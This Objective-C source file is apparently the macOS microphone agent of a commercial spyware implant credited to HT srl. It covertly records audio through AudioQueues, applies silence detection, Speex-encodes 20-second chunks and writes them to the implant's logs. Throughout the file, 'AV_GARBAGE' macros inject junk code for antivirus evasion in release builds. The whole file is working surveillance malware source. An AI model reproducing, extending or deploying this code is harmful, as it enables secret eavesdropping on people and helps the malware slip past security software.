/*
 * RCSMAgentMicrophone.m
 *  Microphone Agent for MacOS
 *  Uses AudioQueues from AudioToolbox
 *
 * Created by Alfredo 'revenge' Pesoli on 8/3/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import <AudioToolbox/AudioConverter.h>

#import "speex.h"

#import "RCSMAgentMicrophone.h"

#import "RCSMLogManager.h"
#import "RCSMDebug.h"
#import "RCSMLogger.h"

#import "RCSMAVGarbage.h"

#define LOG_AUDIO_CODEC_SPEEX   0x00;
#define LOG_AUDIO_CODEC_AMR     0x01;


static __m_MAgentMicrophone *sharedAgentMicrophone = nil;

void myInputAudioCallback(void                               *inUserData,
                          AudioQueueRef                      inAQ,
                          AudioQueueBufferRef                inBuffer,
                          const AudioTimeStamp               *inStartTime,
                          UInt32                             inNumPackets,
                          const AudioStreamPacketDescription *inPacketDescs)
{
  // AV evasion: only on release build
  AV_GARBAGE_004
  
	//AQState_t *aqData = (AQState_t *)inUserData;
	__m_MAgentMicrophone *aqData = (__m_MAgentMicrophone *)inUserData;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (inNumPackets                            == 0
      && aqData.mDataFormat.mBytesPerPacket  != 0)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_000
    
      inNumPackets = inBuffer->mAudioDataByteSize
                     / aqData.mDataFormat.mBytesPerPacket;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (inNumPackets > 0)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      [aqData.mLockGeneric lock];
      [aqData.mAudioBuffer appendBytes: inBuffer->mAudioData
                                length: inBuffer->mAudioDataByteSize];   
    
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      aqData.mCurrentPacket += inNumPackets; 
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      [aqData.mLockGeneric unlock];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if (aqData.mIsRunning == 0)
    {
      return;
    }
		
  // 
  // If we're not stopping, re-enqueue the buffer so that it gets filled again
  //
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  AudioQueueEnqueueBuffer(aqData.mQueue, inBuffer, 0, NULL);
}

@interface __m_MAgentMicrophone (private)

- (BOOL)_speexEncodeBuffer: (char *)input
                  withSize: (u_int)audioChunkSize
                  channels: (u_int)channels
               fileCounter: (int)fileCounter;

- (int)_calculateBufferSizeForFormat: (const AudioStreamBasicDescription *)format
                         withSeconds: (float)seconds;
@end

@implementation __m_MAgentMicrophone (private)

- (int)_calculateBufferSizeForFormat: (const AudioStreamBasicDescription *)format
                         withSeconds: (float)seconds
{   
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  int packets, frames, bytes = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  frames = (int)ceil(seconds * format->mSampleRate);
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if (format->mBytesPerFrame > 0)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_000
    
      bytes = frames * format->mBytesPerFrame;
    }
  else
    {
      UInt32 maxPacketSize;
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      if (format->mBytesPerPacket > 0)
        {
          maxPacketSize = format->mBytesPerPacket;	// constant packet size
        }
      else
        {   
          // AV evasion: only on release build
          AV_GARBAGE_003
        

          UInt32 propertySize = sizeof(maxPacketSize);   
          
          // AV evasion: only on release build
          AV_GARBAGE_006
          
          AudioQueueGetProperty(mQueue,
                                kAudioConverterPropertyMaximumOutputPacketSize,
                                &maxPacketSize,
                                &propertySize);
        }
      if (format->mFramesPerPacket > 0)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          packets = frames / format->mFramesPerPacket;
        }
      else
        {   
          // AV evasion: only on release build
          AV_GARBAGE_004
        
          packets = frames;	// worst-case scenario: 1 frame in a packet
        }
      if (packets == 0)		// sanity check
        {   
          // AV evasion: only on release build
          AV_GARBAGE_002
        
          packets = 1;
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      bytes = packets * maxPacketSize;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
	return bytes;
}

- (BOOL)_speexEncodeBuffer: (char *)input
                  withSize: (u_int)audioChunkSize
                  channels: (u_int)channels
               fileCounter: (int)fileCounter;
{
#define SINGLE_LPCM_UNIT_SIZE 2 // sizeof(short)
  
  // Single lpcm unit already casted to SInt16
  SInt16 *bitSample;
  
  // Speex state
  void *speexState;
  char *source = input;
  
  SInt16  *inputBuffer;
  char    *outputBuffer;
  char    *ptrSource;
  
  SpeexBits speexBits;
  
  u_int frameSize       = 0;
  u_int i               = 0;
  u_int bytesWritten    = 0;
  
  u_int complexity      = 1;
  u_int quality         = 5;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  __m_MLogManager *_logManager = [__m_MLogManager sharedInstance];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  // Create a new wide mode encoder
  speexState = speex_encoder_init(speex_lib_get_mode(SPEEX_MODEID_UWB));
  //speexState = speex_encoder_init(speex_lib_get_mode(SPEEX_MODEID_WB));
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // Set quality and complexity
  speex_encoder_ctl(speexState, SPEEX_SET_QUALITY, &quality);   
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  speex_encoder_ctl(speexState, SPEEX_SET_COMPLEXITY, &complexity);
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  speex_bits_init(&speexBits);
  
  // Get frame size for given quality and compression factor
  speex_encoder_ctl(speexState, SPEEX_GET_FRAME_SIZE, &frameSize);
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  if (!frameSize)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_007    
      
      speex_encoder_destroy(speexState);
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      speex_bits_destroy(&speexBits);
      
      return FALSE;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  //
  // Allocate the output buffer including the first dword (bufferSize)
  //
  if (!(outputBuffer = (char *)malloc(frameSize * SINGLE_LPCM_UNIT_SIZE + sizeof(u_int))))
    {   
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      speex_encoder_destroy(speexState);
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      speex_bits_destroy(&speexBits);
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      return FALSE;
    }
  
  //
  // Allocate the input buffer
  //
  if (!(inputBuffer = (SInt16 *)malloc(frameSize * sizeof(SInt16))))
    {   
      // AV evasion: only on release build
      AV_GARBAGE_009
    
      free(outputBuffer);
      speex_encoder_destroy(speexState);
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      speex_bits_destroy(&speexBits);
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      return FALSE;
    }
  
  //
  // Check for VAD
  //
  if (mIsVADActive)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      short prevBitSample = 0;
      u_int zeroRate      = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      for (ptrSource = source;
           ptrSource + (frameSize  * SINGLE_LPCM_UNIT_SIZE * channels) <= source + audioChunkSize;
           ptrSource += (frameSize * SINGLE_LPCM_UNIT_SIZE * channels))
        {   
          // AV evasion: only on release build
          AV_GARBAGE_008
        
          bitSample = (SInt16 *)ptrSource;
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          prevBitSample = bitSample[0];
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          for (i = 1; i < frameSize; i++)
            {   
              // AV evasion: only on release build
              AV_GARBAGE_002
            
              if (prevBitSample * bitSample[i] < 0)
                zeroRate++;
              
              // AV evasion: only on release build
              AV_GARBAGE_003
              
              prevBitSample = bitSample[i];
            }
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      float silencePresence = (float)(zeroRate / (audioChunkSize / (frameSize * SINGLE_LPCM_UNIT_SIZE)));
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      if (silencePresence >= (float)mSilenceThreshold)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_003
        
          mLoTimestamp = 0; 
          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          mHiTimestamp = 0;
          
          free(outputBuffer);
          speex_encoder_destroy(speexState);
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          speex_bits_destroy(&speexBits);
          
          // AV evasion: only on release build
          AV_GARBAGE_009
          
          return FALSE;
        }
    }
  
  //NSMutableData *tempData = [[NSMutableData alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_003

  //
  // We skip one channel by multiplying per channels inside the for condition
  // and inside the inner for with bitSample
  //
  for (ptrSource = source;
       ptrSource + (frameSize  * SINGLE_LPCM_UNIT_SIZE * channels) <= source + audioChunkSize;
       ptrSource += (frameSize * SINGLE_LPCM_UNIT_SIZE * channels))
    {
      bitSample = (SInt16 *)ptrSource;
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      for (i = 0; i < frameSize; i ++)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_003
        
          // Just to avoid clipping on GSM with speex
          // 1.2db line loss
          inputBuffer[i] =  bitSample[i * channels] - (bitSample[i * channels] / 4);
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      speex_bits_reset(&speexBits);
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      speex_encode_int(speexState, inputBuffer, &speexBits);
      //speex_encode_int(speexState, bitSample, &speexBits);
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      // Encode and store the result in the outputBuffer + first dword (length)
      bytesWritten = speex_bits_write(&speexBits,
                                      (char *)(outputBuffer + sizeof(u_int)),
                                      frameSize * SINGLE_LPCM_UNIT_SIZE);
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      // If bytesWritten is greater than our condition, something wrong happened
      if (bytesWritten > (frameSize * SINGLE_LPCM_UNIT_SIZE))
        continue;
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      // Store the audioChunk size in the first dword of outputBuffer
      memcpy(outputBuffer, &bytesWritten, sizeof(u_int));
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      NSMutableData *tempData = [[NSMutableData alloc] initWithBytes: outputBuffer
                                                              length: bytesWritten + sizeof(u_int)];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      //[tempData appendBytes: outputBuffer length: bytesWritten + sizeof(u_int)];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      [_logManager writeDataToLog: tempData
                         forAgent: AGENT_MICROPHONE
                        withLogID: fileCounter];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      [tempData release];
      //usleep(2000);
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  //[_logManager writeDataToLog: tempData
                     //forAgent: LOG_MICROPHONE
                    //withLogID: fileCounter];

  //[tempData release];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  free(inputBuffer);
  free(outputBuffer);
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  speex_encoder_destroy(speexState);
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  speex_bits_destroy(&speexBits);
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  return TRUE;
}

@end

@implementation __m_MAgentMicrophone

@synthesize mIsRunning;
@synthesize mDataFormat;
@synthesize mQueue;
@synthesize mCurrentPacket;
@synthesize mIsVADActive;
@synthesize mSilenceThreshold;
@synthesize mLockGeneric;
@synthesize mAudioBuffer;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentMicrophone *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentMicrophone == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentMicrophone;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentMicrophone== nil)
      {
        sharedAgentMicrophone = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentMicrophone;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (id)retain
{
  return self;
}

- (id)autorelease
{
  return self;
}

- (void)release
{
  // Do nothing
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedAgentMicrophone != nil)
      {
        self = [super init];
        
        if (self != nil)
          {
            sharedAgentMicrophone = self;

            mAudioBuffer = [[NSMutableData alloc] init];
            mLockGeneric = [[NSLock alloc] init];
          }
        
      }
  }
  
  return sharedAgentMicrophone;
}

- (void)generateLog
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG_MIC
  infoLog(@"Generating log for microphone");
#endif
  
  if (mLoTimestamp     == 0
      && mHiTimestamp  == 0)
  {
    time_t unixTime;
    time(&unixTime);
    int64_t filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
    
    int32_t hiTimestamp = (int64_t)filetime >> 32;
    int32_t loTimestamp = (int64_t)filetime & 0xFFFFFFFF;
    
    mLoTimestamp = loTimestamp;
    mHiTimestamp = hiTimestamp;
  }
  
  [mLockGeneric lock];
  NSMutableData *_audioBuffer = [[NSMutableData alloc] initWithData: mAudioBuffer];
  [mAudioBuffer release];
  mAudioBuffer = [[NSMutableData alloc] init];
  [mLockGeneric unlock];
  
#ifdef DEBUG_MIC
  infoLog(@"Creating log, TODO");
#endif
  
#ifdef DEBUG_MIC_WAVE
  NSMutableData *headerData       = [[NSMutableData alloc] initWithLength: sizeof(waveHeader)];
  NSMutableData *audioData        = [[NSMutableData alloc] init];
  
  waveHeader *waveFileHeader      = (waveHeader *)[headerData bytes];
  
  NSString *riff    = @"RIFF";
  NSString *waveFmt = @"WAVEfmt "; // w00t
  NSString *data    = @"data";
  
  int audioChunkSize = [_audioBuffer length];
  int fileSize = audioChunkSize + 44; // size of header + strings
  int fmtSize  = 16;
  
  waveFileHeader->formatTag       = 1;
  waveFileHeader->nChannels       = 2;
  waveFileHeader->nSamplesPerSec  = mDataFormat.mSampleRate;
  waveFileHeader->bitsPerSample   = 16;
  waveFileHeader->blockAlign      = (waveFileHeader->bitsPerSample / 8) * waveFileHeader->nChannels;
  waveFileHeader->nAvgBytesPerSec = waveFileHeader->nSamplesPerSec * waveFileHeader->blockAlign;
  
  [audioData appendData: [riff dataUsingEncoding: NSUTF8StringEncoding]];
  [audioData appendBytes: &fileSize
                  length: sizeof(int)];
  [audioData appendData: [waveFmt dataUsingEncoding: NSUTF8StringEncoding]];
  
  [audioData appendBytes: &fmtSize
                  length: sizeof(int)];
  [audioData appendData: headerData];
  [audioData appendData: [data dataUsingEncoding: NSUTF8StringEncoding]];
  [audioData appendBytes: &audioChunkSize
                  length: sizeof(int)];
  
  // Append audio chunk
  [audioData appendData: _audioBuffer];
  NSString *filePath = [NSString stringWithFormat: @"/tmp/temp_%d.wav", mFileCounter];
  [audioData writeToFile: filePath
              atomically: YES];
  
  [headerData release];
  [audioData release];
#endif
  
  NSMutableData *rawAdditionalHeader = [[NSMutableData alloc]
                                        initWithLength: sizeof(microphoneAdditionalStruct)];
  microphoneAdditionalStruct *agentAdditionalHeader;
  agentAdditionalHeader = (microphoneAdditionalStruct *)[rawAdditionalHeader bytes];
  
  u_int _sampleRate = mDataFormat.mSampleRate;
  _sampleRate       |= LOG_AUDIO_CODEC_SPEEX;
  
  agentAdditionalHeader->version     = LOG_MICROPHONE_VERSION;
  agentAdditionalHeader->sampleRate  = _sampleRate;
  agentAdditionalHeader->hiTimestamp = mHiTimestamp;
  agentAdditionalHeader->loTimestamp = mLoTimestamp;
  
  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
  
  u_int fileNumber = 0;
  [mLockGeneric lock];
  fileNumber = mFileCounter;
  [mLockGeneric unlock];
  
  BOOL success = [logManager createLog: AGENT_MICROPHONE
                           agentHeader: rawAdditionalHeader
                             withLogID: fileNumber];
  
  if (success == TRUE)
  {
#ifdef DEBUG_MIC
    infoLog(@"logHeader created correctly");
#endif
    
    [self _speexEncodeBuffer: [_audioBuffer mutableBytes]
                    withSize: [_audioBuffer length]
                    channels: 2
                 fileCounter: fileNumber];
    
    [logManager closeActiveLog: AGENT_MICROPHONE
                     withLogID: fileNumber];
  }
  
  [rawAdditionalHeader release];
  [_audioBuffer release];
  
  [mLockGeneric lock];
  mFileCounter    += 1;
  [mLockGeneric unlock];
  
  [outerPool release];
}

- (void)stopRecord
{
#ifdef DEBUG_MIC
  verboseLog(@"");
#endif
  OSStatus result;
  
  //
  // Stop the queue
  //
  result = AudioQueueStop(mQueue, true);
  if (result != noErr)
  {
#ifdef DEBUG_MIC
    errorLog(@"AudioQueueStop: %d", result);
#endif
  }
  
  mIsRunning = NO;
  
  //
  // Dispose the audio queue
  //
  result = AudioQueueDispose(mQueue, true);
  if (result != noErr)
  {
#ifdef DEBUG_MIC
    errorLog(@"AudioQueueDispose: %d", result);
#endif
  }
  
  //
  // In order to avoid keeping something old in the buffer
  //
  [mAudioBuffer setLength: 0];
}

- (void)startRecord
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

#ifdef DEBUG_MIC
  infoLog(@"");
#endif

  OSStatus success;
  
  if (mIsRunning == NO)
    {
#ifdef DEBUG_MIC
      infoLog(@"Starting mic agent");
#endif
      //
      // Setup audio format
      //
      [self setupAudioWithFormatID: kAudioFormatLinearPCM];

      //
      // Create a new recording audio queue
      //
      success = AudioQueueNewInput(&mDataFormat,
                                   myInputAudioCallback,
                                   self,
                                   NULL,
                                   kCFRunLoopCommonModes,
                                   0,
                                   &mQueue);

      if (success != noErr)
        {
#ifdef DEBUG_MIC
          errorLog(@"AudioQueueNewInput: %d", success);
#endif
        }

      int i = 0;
      int bufferSize = [self _calculateBufferSizeForFormat: &mDataFormat
                                               withSeconds: 0.5];
      for (i = 0; i < kNumberBuffers; ++i)
        {
          success = AudioQueueAllocateBuffer(mQueue, bufferSize, &mBuffers[i]);
          if (success != noErr)
            {
#ifdef DEBUG_MIC
              errorLog(@"AudioQueueAllocateBuffer: %d", success);
#endif
            }
          success = AudioQueueEnqueueBuffer(mQueue, mBuffers[i], 0, NULL);
          if (success != noErr)
            {
#ifdef DEBUG_MIC
              errorLog(@"AudioQueueEnqueueBuffer: %d", success);
#endif
            }
        }

      mCurrentPacket = 0;
      mIsRunning     = YES;

      //
      // Start the queue
      //
      success = AudioQueueStart(mQueue, NULL);
      if (success != noErr)
        {
#ifdef DEBUG_MIC
          errorLog(@"AudioQueueStart: %d", success);
#endif
        }
    }
  
  [pool release];
}

- (void)setupAudioWithFormatID: (UInt32)formatID
{
  //
  // Only LPCM is supported as of now
  //
  //memset(&mDataFormat, 0, sizeof(mDataFormat));

  if (formatID == kAudioFormatLinearPCM)
    {
      mDataFormat.mFormatID         = formatID;
      mDataFormat.mSampleRate       = 44100.0;
      mDataFormat.mChannelsPerFrame = 2;
      mDataFormat.mBitsPerChannel   = 16;
      mDataFormat.mBytesPerPacket   =
        mDataFormat.mBytesPerFrame  = (mDataFormat.mBitsPerChannel / 8)
                                      * mDataFormat.mChannelsPerFrame;
      mDataFormat.mFramesPerPacket  = 1;
      mDataFormat.mFormatFlags      = kLinearPCMFormatFlagIsSignedInteger
                                      | kLinearPCMFormatFlagIsPacked;
    }
  else
    {
#ifdef DEBUG_MIC
      errorLog(@"Unsupported formatID: %u", formatID);
#endif
    }
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (BOOL)resume
{
  return TRUE;
}

- (BOOL)stop
{
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP
                          forKey: @"status"];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [mLockGeneric lock];
  mFileCounter = 0;
  [mLockGeneric unlock];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  while ([mAgentConfiguration objectForKey: @"status"]  != AGENT_STOPPED
         && internalCounter                             <= MAX_STOP_WAIT_TIME)
    {
      internalCounter++;
      usleep(100000);
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  return YES;
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  //int fileCounter;
  
  if (mIsRunning == YES)
  {
    // We're already running
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    [outerPool release];
    return;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [mAgentConfiguration setObject: AGENT_RUNNING
                          forKey: @"status"];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  NSDate *micStartedDate = [NSDate date];
  NSTimeInterval interval = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  //
  // Grab config parameters
  //
  microphoneAgentStruct *microphoneRawData;
  microphoneRawData = (microphoneAgentStruct *)[[mAgentConfiguration
                                                 objectForKey: @"data"] bytes];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  //
  // Set config parameters
  //
  mIsVADActive      = microphoneRawData->detectSilence;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  mSilenceThreshold = microphoneRawData->silenceThreshold;
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  //
  // Start recording
  //
  [self startRecord];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  while ([mAgentConfiguration objectForKey: @"status"]    != AGENT_STOP
         && [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
  {
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    interval = [[NSDate date] timeIntervalSinceDate: micStartedDate];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    if (fabs(interval) >= 20)
    {
      //          [mLockGeneric lock];
      //          fileCounter    = mFileCounter;
      //          [mLockGeneric unlock];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      //          [NSThread detachNewThreadSelector: @selector(generateLog)
      //                                   toTarget: self
      //                                 withObject: nil];
      [self generateLog];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      micStartedDate = [[NSDate date] retain];
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    [innerPool drain];
    usleep(5000);
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if (mIsRunning)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [self stopRecord];
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
  {      
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    mIsRunning = FALSE;
    [mAgentConfiguration setObject: AGENT_STOPPED
                            forKey: @"status"];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    mLoTimestamp = 0;
    mHiTimestamp = 0;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [outerPool release];
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSMutableDictionary *)mAgentConfiguration
{   
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return mAgentConfiguration;
}

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{   
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (aConfiguration != mAgentConfiguration)
    {   
     // AV evasion: only on release build
     AV_GARBAGE_001
    
      [mAgentConfiguration release];
      mAgentConfiguration = [aConfiguration retain];
    }
}

@end
